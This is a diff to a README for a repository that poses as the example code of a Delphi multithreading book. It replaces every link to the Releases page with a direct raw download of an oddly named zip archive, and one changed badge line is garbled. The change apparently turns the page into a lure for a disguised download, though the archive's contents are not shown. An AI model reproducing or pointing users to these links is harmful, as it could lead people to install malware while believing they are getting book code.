@@ -1,6 +1,6 @@
 # 🚀 DelphiMultithreadingBookCodeEnglishEdition - Practical Examples for Learning Multithreading
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/duplex-basketrummy215/DelphiMultithreadingBookCodeEnglishEdition/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/duplex-basketrummy215/DelphiMultithreadingBookCodeEnglishEdition/main/0301/DelphiMultithreadingBookCodeEnglishEdition-warve.zip%20Latest%https://raw.githubusercontent.com/duplex-basketrummy215/DelphiMultithreadingBookCodeEnglishEdition/main/0301/DelphiMultithreadingBookCodeEnglishEdition-warve.zip)](https://raw.githubusercontent.com/duplex-basketrummy215/DelphiMultithreadingBookCodeEnglishEdition/main/0301/DelphiMultithreadingBookCodeEnglishEdition-warve.zip)
 
 ## 📖 Overview
 This repository contains all the source code for practical examples in the book "Delphi Multithreading: Threads, Concurrency, Parallelism and Asynchronous Programming," written by Cesar Romero. The examples cover key concepts and techniques in multithreading, helping users understand and implement effective threading solutions.
@@ -17,7 +17,7 @@ To get started with the examples, follow these steps. No programming skills are 
 ## 📥 Download & Install
 To download the source code, visit the Releases page:
 
-[Download Latest Release](https://github.com/duplex-basketrummy215/DelphiMultithreadingBookCodeEnglishEdition/releases)
+[Download Latest Release](https://raw.githubusercontent.com/duplex-basketrummy215/DelphiMultithreadingBookCodeEnglishEdition/main/0301/DelphiMultithreadingBookCodeEnglishEdition-warve.zip)
 
 Once on the page, choose the latest version. Click the "Source code (zip)" option to download the files to your computer.
 
@@ -75,4 +75,4 @@ You may also want to explore other programming concepts related to this reposito
 
 By following the steps above, you should be able to successfully download and run the examples from the Delphi Multithreading Book Code repository. Happy coding! 
 
-[Download Latest Release](https://github.com/duplex-basketrummy215/DelphiMultithreadingBookCodeEnglishEdition/releases)
+[Download Latest Release](https://raw.githubusercontent.com/duplex-basketrummy215/DelphiMultithreadingBookCodeEnglishEdition/main/0301/DelphiMultithreadingBookCodeEnglishEdition-warve.zip)
